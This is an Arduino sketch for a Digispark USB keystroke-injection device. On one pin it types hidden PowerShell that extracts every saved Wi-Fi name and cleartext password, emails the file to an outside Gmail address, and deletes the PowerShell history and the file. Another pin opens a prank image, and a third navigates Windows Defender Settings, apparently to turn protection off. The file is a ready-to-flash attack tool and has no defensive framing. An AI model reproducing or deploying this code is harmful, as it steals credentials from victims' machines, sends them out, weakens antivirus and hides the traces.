#include "DigiKeyboard.h"
#define KEY_ESC      41
int v0 = 0;
int v1 = 0;
int v2 = 0;
int v3 = 0;
int v4 = 0;
void setup() {
  pinMode(0, INPUT); 
  pinMode(1, INPUT); 
  pinMode(2, INPUT);
}

void loop() {
  v0 = digitalRead(0);
  v1 = digitalRead(1);
  v2 = digitalRead(2);
  if (v0 == HIGH){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv temp.csv\""));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('email', 'password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'ClydeJaques@gmail.com'; $ReportEmail.To.Add('brettmaster1@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail)\""));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\""));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("del temp.csv"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
    DigiKeyboard.print(F("exit"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    for(;;){ /*empty*/ }
  } else if (v1 == HIGH){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print(F("https://i.imgflip.com/1dv8ac.jpg"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_F11);
    for(;;){ /*empty*/ }
  } else if (v2 == HIGH){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
    DigiKeyboard.delay(2500);
    DigiKeyboard.print(F("Windows Defender Settings"));
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5500);
    DigiKeyboard.sendKeyStroke(43);
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_A, MOD_GUI_LEFT);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(43);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(43);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(41);
    for(;;){ /*empty*/ }
  }
}